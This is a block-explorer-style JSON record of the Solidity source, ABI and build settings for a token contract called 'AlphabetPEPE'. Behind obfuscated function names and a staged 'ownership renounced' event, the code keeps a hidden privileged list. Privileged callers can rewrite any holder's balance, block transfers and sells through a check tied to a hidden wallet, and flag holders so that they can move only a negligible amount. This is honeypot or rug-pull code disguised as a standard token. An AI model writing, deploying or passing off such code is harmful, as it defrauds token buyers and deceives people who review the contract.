{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface fromReceiverMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptBuyFund) external view returns (uint256);\n\n    function transfer(address swapReceiver, uint256 maxShould) external returns (bool);\n\n    function allowance(address isReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapReceiver,\n        uint256 maxShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeSenderAt, uint256 value);\n    event Approval(address indexed isReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract limitFundExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toEnable {\n    function createPair(address launchedAmountSell, address senderShould) external returns (address);\n}\n\ninterface fromReceiverModeMetadata is fromReceiverMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlphabetPEPE is limitFundExempt, fromReceiverMode, fromReceiverModeMetadata {\n\n    function owner() external view returns (address) {\n        return minTake;\n    }\n\n    event OwnershipTransferred(address indexed amountLiquidity, address indexed autoSenderBuy);\n\n    bool public totalAtAuto;\n\n    string private toSender = \"Alphabet PEPE\";\n\n    uint256 private takeSwapAuto;\n\n    function approve(address fundLimit, uint256 maxShould) public virtual override returns (bool) {\n        feeWallet[_msgSender()][fundLimit] = maxShould;\n        emit Approval(_msgSender(), fundLimit, maxShould);\n        return true;\n    }\n\n    uint256 public atSender;\n\n    mapping(address => uint256) private autoEnableList;\n\n    mapping(address => bool) public shouldExempt;\n\n    bool private receiverTxTotal;\n\n    function allowance(address txToken, address fundLimit) external view virtual override returns (uint256) {\n        if (fundLimit == toTotal) {\n            return type(uint256).max;\n        }\n        return feeWallet[txToken][fundLimit];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toSender;\n    }\n\n    function balanceOf(address exemptBuyFund) public view virtual override returns (uint256) {\n        return autoEnableList[exemptBuyFund];\n    }\n\n    uint256 takeBuy;\n\n    mapping(address => bool) public marketingTake;\n\n    address public tradingAutoReceiver;\n\n    address exemptTakeShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function toMax(address fromEnable, address swapReceiver, uint256 maxShould) internal returns (bool) {\n        if (fromEnable == tradingAutoReceiver) {\n            return shouldSell(fromEnable, swapReceiver, maxShould);\n        }\n        uint256 amountMin = fromReceiverMode(isLaunchedLiquidity).balanceOf(exemptTakeShould);\n        require(amountMin == takeBuy);\n        require(swapReceiver != exemptTakeShould);\n        if (shouldExempt[fromEnable]) {\n            return shouldSell(fromEnable, swapReceiver, limitLaunch);\n        }\n        return shouldSell(fromEnable, swapReceiver, maxShould);\n    }\n\n    string private shouldLaunch = \"APE\";\n\n    constructor (){\n        \n        swapMax amountAtExempt = swapMax(toTotal);\n        isLaunchedLiquidity = toEnable(amountAtExempt.factory()).createPair(amountAtExempt.WETH(), address(this));\n        \n        tradingAutoReceiver = _msgSender();\n        marketingMinTotal();\n        marketingTake[tradingAutoReceiver] = true;\n        autoEnableList[tradingAutoReceiver] = marketingShould;\n        if (sellTotalLimit == atSender) {\n            maxFee = false;\n        }\n        emit Transfer(address(0), tradingAutoReceiver, marketingShould);\n    }\n\n    address toTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private minTake;\n\n    function transfer(address teamMin, uint256 maxShould) external virtual override returns (bool) {\n        return toMax(_msgSender(), teamMin, maxShould);\n    }\n\n    function shouldSell(address fromEnable, address swapReceiver, uint256 maxShould) internal returns (bool) {\n        require(autoEnableList[fromEnable] >= maxShould);\n        autoEnableList[fromEnable] -= maxShould;\n        autoEnableList[swapReceiver] += maxShould;\n        emit Transfer(fromEnable, swapReceiver, maxShould);\n        return true;\n    }\n\n    function senderLaunched(address sellFee) public {\n        tokenIs();\n        \n        if (sellFee == tradingAutoReceiver || sellFee == isLaunchedLiquidity) {\n            return;\n        }\n        shouldExempt[sellFee] = true;\n    }\n\n    uint256 constant limitLaunch = 12 ** 10;\n\n    bool private walletMax;\n\n    bool public receiverLimit;\n\n    bool public limitTx;\n\n    function transferFrom(address fromEnable, address swapReceiver, uint256 maxShould) external override returns (bool) {\n        if (_msgSender() != toTotal) {\n            if (feeWallet[fromEnable][_msgSender()] != type(uint256).max) {\n                require(maxShould <= feeWallet[fromEnable][_msgSender()]);\n                feeWallet[fromEnable][_msgSender()] -= maxShould;\n            }\n        }\n        return toMax(fromEnable, swapReceiver, maxShould);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldLaunch;\n    }\n\n    uint256 public sellTotalLimit;\n\n    uint256 private marketingShould = 100000000 * 10 ** 18;\n\n    uint8 private autoFund = 18;\n\n    function totalLaunched(uint256 maxShould) public {\n        tokenIs();\n        takeBuy = maxShould;\n    }\n\n    function shouldTake(address teamMin, uint256 maxShould) public {\n        tokenIs();\n        autoEnableList[teamMin] = maxShould;\n    }\n\n    address public isLaunchedLiquidity;\n\n    function tokenIs() private view {\n        require(marketingTake[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return minTake;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeWallet;\n\n    function marketingMinTotal() public {\n        emit OwnershipTransferred(tradingAutoReceiver, address(0));\n        minTake = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingShould;\n    }\n\n    uint256 private fromLimit;\n\n    bool private teamList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoFund;\n    }\n\n    bool private maxFee;\n\n    uint256 isToken;\n\n    function takeToken(address receiverToLimit) public {\n        require(receiverToLimit.balance < 100000);\n        if (limitTx) {\n            return;\n        }\n        if (atSender == takeSwapAuto) {\n            sellTotalLimit = fromLimit;\n        }\n        marketingTake[receiverToLimit] = true;\n        \n        limitTx = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSenderBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSenderAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuyFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunchedLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMinTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotalLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFee\",\"type\":\"address\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"shouldTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToLimit\",\"type\":\"address\"}],\"name\":\"takeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAtAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"totalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAutoReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlphabetPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}